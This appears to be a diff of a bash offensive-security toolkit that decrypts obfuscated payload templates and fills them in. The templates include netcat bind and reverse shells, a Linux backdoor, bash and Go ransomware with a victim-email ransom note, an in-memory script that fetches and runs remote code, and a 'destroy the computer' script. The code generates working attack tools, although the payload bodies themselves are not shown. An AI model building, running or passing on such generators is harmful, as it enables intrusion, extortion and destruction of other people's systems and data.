@@ -66,37 +66,46 @@ parsehistory="$bin/parse_history"
 parsepasswords="$bin/parse_password"
 # lib folders files used for copy/paste to create mostly payloads and ransomware
 lib="$home_dir/lib"
-ncb="$lib/HCDOUNASIXNTM7Q3YR-X-encoded.enc" # netcat binding script
-ncbo="$lib/NetcatBindShell-X-encoded"
+
 NetcatBindShell="$lib/NetcatBindShell"
-ncr="$lib/QI2NTM7Q3YRVBGDBR-X-encoded.enc" # netcat rev script
-ncro="$lib/NetcatRevShell-X-encoded"
+ncbo="$lib/NetcatBindShell-X-encoded"
+ncb="$lib/HCDOUNASIXNTM7Q3YR-X-encoded.enc"
+
 NetcatRevShell="$lib/NetcatReverseShell"
-rvs="$lib/YXOKETATIH4WMF4KG-X-encoded.enc" # rev shell script
-rvso="$lib/LinuxRevShell-X-encoded"
+ncro="$lib/NetcatRevShell-X-encoded"
+ncr="$lib/QI2NTM7Q3YRVBGDBR-X-encoded.enc"
+
 LinuxRevShell="$lib/LinuxReverseShell"
-rwe="$lib/WAHCDOUNASIXWNVBKYNTW-X-encoded.enc" # ransom enc
-rweo="$lib/RansomDirty-X-encoded"
+rvso="$lib/LinuxRevShell-X-encoded"
+rvs="$lib/YXOKETATIH4WMF4KG-X-encoded.enc"
+
 RansomEncrypt="$lib/RansomwareEncryptScript"
-rwd="$lib/TCAOMB3MU7XN3A6HGKLI2ZYDJ-X-encoded.enc" # ransom dec
-rwdo="$lib/RansomClean-X-encoded"
+rweo="$lib/RansomDirty-X-encoded"
+rwe="$lib/WAHCDOUNASIXWNVBKYNTW-X-encoded.enc"
+
 RansomDecrypt="$lib/RansomwareDecryptScript"
-rwg="$lib/pEvAOjfBikdPKoXzqwqGlEGdaROaibAO-X-encoded.enc" # ransomware in go
-rwgo="$lib/RansomCleanGo-X-encoded"
+rwdo="$lib/RansomClean-X-encoded"
+rwd="$lib/TCAOMB3MU7XN3A6HGKLI2ZYDJ-X-encoded.enc"
+
 RansomEncryptGo="$lib/Ransomware_Encrypt.go"
+rwgo="$lib/RansomCleanGo-X-encoded"
+rwg="$lib/pEvAOjfBikdPKoXzqwqGlEGdaROaibAO-X-encoded.enc"
 RansomwareEGo="$lib/Ransomware_Encrypt"
 RansomwareEGoW="$lib/Ransomware_Encrypt.exe"
-rdg="$lib/STNSNkFPTYCYwDYSEGkHMVsNxuYPwJYc-X-encoded.enc" # ransomware decrypt in go
-rdgo="$lib/RansomDecrypt-X-encoded"
+
 RansomDecryptGo="$lib/Ransomware_Decrypt.go"
+rdgo="$lib/RansomDecrypt-X-encoded"
+rdg="$lib/STNSNkFPTYCYwDYSEGkHMVsNxuYPwJYc-X-encoded.enc"
 RansomwareDGo="$lib/Ransomware_Decrypt"
 RansomwareDGoW="$lib/Ransomware_Decrypt.exe"
-nts="$lib/6UR4STTDXCBXV7NYNZTDTRKFQ-X-encoded.enc" # no touch script
-ntso="$lib/NoTouchScript-X-encoded"
+
 NoTouchScript="$lib/NoTouchScript"
-dtc="$lib/oXytNFO911-X-encoded.enc" # Destroy the computer
-dtco="$lib/destroy_computer-X-encoded"
+ntso="$lib/NoTouchScript-X-encoded"
+nts="$lib/6UR4STTDXCBXV7NYNZTDTRKFQ-X-encoded.enc"
+
 DestroyTheComputer="$lib/destroy_computer"
+dtco="$lib/destroy_computer-X-encoded"
+dtc="$lib/IXNTM7QIXWNVBKYNTTATIH4STTDXC-X-encoded.enc"
 # cstk deployment kit
 zip2go_enc="$lib/cstk_postxzipkit"
 zip2go="$Malware/cstk_Post_x_Kit.zip"
@@ -1151,12 +1160,12 @@ fi
 # Class: PAYLOADS - Tool: Netcat Bind Shell Payload - Option 1-A
 netcat_shells_bind() {
 file="$NetcatBindShell"
-trap 'rm -f $file' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+trap 'rm -f $file $ncbo ' SIGQUIT SIGILL SIGTERM SIGHUP
 clear
 getip
 payloads_nc_frame
 openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$ncb" -out "$ncbo" -pass pass:"$pswd"
-base32hex -d "$ncbo" | base64 --wrap 16 -d | base32plain -d > "$NetcatBindShell"
+base32hex -d "$ncbo" | base64 -d | base32plain -d > "$NetcatBindShell"
 template=$(cat "$NetcatBindShell")
 final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
 echo "$final_script" > netcatbindshell.temp1 # create full correct script
@@ -1178,12 +1187,12 @@ fi
 # Class: PAYLOADS - Tool: Netcat Reverse Shell - Option 1-B
 netcat_shells_reverse() {
 file="$NetcatRevShell"
-trap 'rm -f $file' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+trap 'rm -f $file $ncro' SIGQUIT SIGILL SIGTERM SIGHUP
 clear
 getip
 payloads_nc_frame
 openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$ncr" -out "$ncro" -pass pass:"$pswd"
-base32hex -d "$ncro" | base64 --wrap 16 -d | base32plain -d > "$NetcatRevShell"
+base32hex -d "$ncro" | base64 -d | base32plain -d > "$NetcatRevShell"
 template=$(cat "$NetcatRevShell")
 final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
 echo "$final_script" > netcatreverseshell.temp1 # create full correct script
@@ -1206,12 +1215,12 @@ fi
 # Class: PAYLOADS - Tools: Linux Back door Creator - Option 2
 rev_shells() {
 file="$LinuxRevShell"
-trap 'rm -f $file' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
 clear
 getip
 payloads_linuxshells_frame
 openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rvs" -out "$rvso" -pass pass:"$pswd"
-base32hex -d "$rvso" | base64 --wrap 16 -d | base32plain -d > "$LinuxRevShell"
+base32hex -d "$rvso" | base64 -d | base32plain -d > "$LinuxRevShell"
 template=$(cat "$LinuxRevShell")
 final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
 echo  "$final_script" > revshell.temp1
@@ -1244,7 +1253,7 @@ fi
 
 ransomware_in_go() {
 file="$RansomEncryptGo"
-trap 'rm -f $file' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
 clear
 payloads_ransomware_frame
 sleep 3
@@ -1308,8 +1317,8 @@ until [[ "$decfilename" != "" ]]; do
 done
 openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwg" -out "$rwgo" -pass pass:"$pswd" &>/dev/null
 openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rdg" -out "$rdgo" -pass pass:"$pswd" &>/dev/null
-base32hex -d "$rwgo" | base64 --wrap 16 -d | base32plain -d > "$RansomEncryptGo"
-base32hex -d "$rdgo" | base64 --wrap 16 -d | base32plain -d > "$RansomDecryptGo"
+base32hex -d "$rwgo" | base64 -d | base32plain -d > "$RansomEncryptGo"
+base32hex -d "$rdgo" | base64 -d | base32plain -d > "$RansomDecryptGo"
 pushd "$lib" &>/dev/null || return
 env GOOS="$system" GOARCH="$arch" go build "$RansomEncryptGo"
 env GOOS="$system" GOARCH="$arch" go build "$RansomDecryptGo"
@@ -1339,7 +1348,7 @@ fi
 # Class: PAYLOADS - Tool: Ransomware encrypt/decrypt script - Option 3
 ransomware_quick_dirty() {
 file="$RansomEncrypt"
-trap 'rm -f $file' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
 clear
 payloads_ransomware_frame
 echo -e "\n\n $g Enter a password for encrypting of the self generating key. $x \n"
@@ -1356,8 +1365,8 @@ echo -e "\n\n $g Enter a email address for victim to respond for decryption key.
 read -r -p "${c} ${A} ${x}" EMAIL # get a email for user
 openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwe" -out "$rweo" -pass pass:"$pswd"
 openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwd" -out "$rwdo" -pass pass:"$pswd"
-base32hex -d "$rweo" | base64 --wrap 16 -d | base32plain -d > "$RansomEncrypt"
-base32hex -d "$rwdo" | base64 --wrap 16 -d | base32plain -d > "$RansomDecrypt"
+base32hex -d "$rweo" | base64 -d | base32plain -d > "$RansomEncrypt"
+base32hex -d "$rwdo" | base64 -d | base32plain -d > "$RansomDecrypt"
 template=$(cat "$RansomEncrypt")
 template_d=$(cat "$RansomDecrypt")
 final_script=$(echo "$template" | awk -v email="$EMAIL" -v password1="$PASSWORD1" '{ gsub(/EMAIL/, email) ; gsub(/PASSWORD/, password1) ; print }')
@@ -1389,7 +1398,7 @@ fi
 # Class:PAYLOADS - Tool:Multi reverse shell option script - Option 4 (wrapper used)
 rev_shells_all() {
 file="$make_shells_bin"
-trap 'rm -f $file' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
 clear
 payloads_allshells_frame
 sleep 3
@@ -1413,7 +1422,7 @@ wait_and_return
 # Class: PAYLOADS - Tool: no touch disk payload - Option 5
 no_touch_script() {
 file="$NoTouchScript"
-trap 'rm -f $file' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
 clear
 payloads_notouch_frame
 echo -e "$b \nIs website http or https:?"
@@ -1423,7 +1432,7 @@ read -r -p "${c} ${A} ${x}" HOST
 echo -e "$c \nEnter the script name for target to grab and run in memory Example: payload-in-memory.sh \n $x"
 read -r -p "${c} ${A} ${x}" SCRIPT
 openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$nts" -out "$ntso" -pass pass:"$pswd"
-base32hex -d "$ntso" | base64 --wrap 16 -d | base32plain -d > "$NoTouchScript"
+base32hex -d "$ntso" | base64 -d | base32plain -d > "$NoTouchScript"
 template=$(cat "$NoTouchScript")
 script=$(echo "$template" | awk -v http="$HTTP" -v host="$HOST" -v script="$SCRIPT" '{ gsub(/HTTP/, http) ; gsub(/HOST/, host) ; gsub(/SCRIPT/, script) ; print }')
 echo "$script" > no_touch_disk.temp1
@@ -1446,7 +1455,7 @@ fi
 # Class: PAYLOADS - Tool: destroy this computer - Option 6
 destroy_computer() {
 file="$DestroyTheComputer"
-trap 'rm -f $file' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
 echo 'This creates a executable script that if ran will completely destroy the computer it is ran on ! THIS IS NO JOKE !'
 echo "Are you sure this is something you want to create and you will not use to harm others? Type a capital 'YES' if your sure and you understand i will not be held responsible."
 read -r -p "${c} ${A} ${x}" opt
@@ -1454,7 +1463,7 @@ if [ "$opt" != YES ]; then
 	exit
 else
 	openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$dtc" -out "$dtco" -pass pass:"$pswd"
-	base32hex -d "$dtco" | base64 --wrap 16 -d | base32plain -d > "$DestroyTheComputer"
+	base32hex -d "$dtco" | base64 -d | base32plain -d > "$DestroyTheComputer"
 #		bash-obfuscate -c 2 -r "$DestroyTheComputer" -o destroy.temp
 #		echo '#!/bin/bash' > destroy.temp2
 #		cat destroy.temp >> destroy.temp2
@@ -1730,7 +1739,7 @@ wait_and_return
 # Class: POST EXPLOIT - Tool: Kernel Exploit - Option 5 (Wrapper Used)
 linux_exploits_check() {
 file="$linux_exploit_checker_bin"
-trap 'rm -f $file' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
 clear
 postx_kernalx_frame
 sleep 3
@@ -2119,7 +2128,7 @@ wait_and_return
 # Class: ETC - Tool: Post exploit tools to go - Option 7
 past_x_2_go() {
 file="$zip2go"
-trap 'rm -f $file' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
 echo -e "\nThe targets computer will need zip, base64/32/16, and xxd\nAll these tools should be standard on most linux systems\nContinue? y/n"
 read -r -n 1 -p "${c} ${A} ${x}" opt
 if [[ "$opt" =~ [Nn] ]]; then
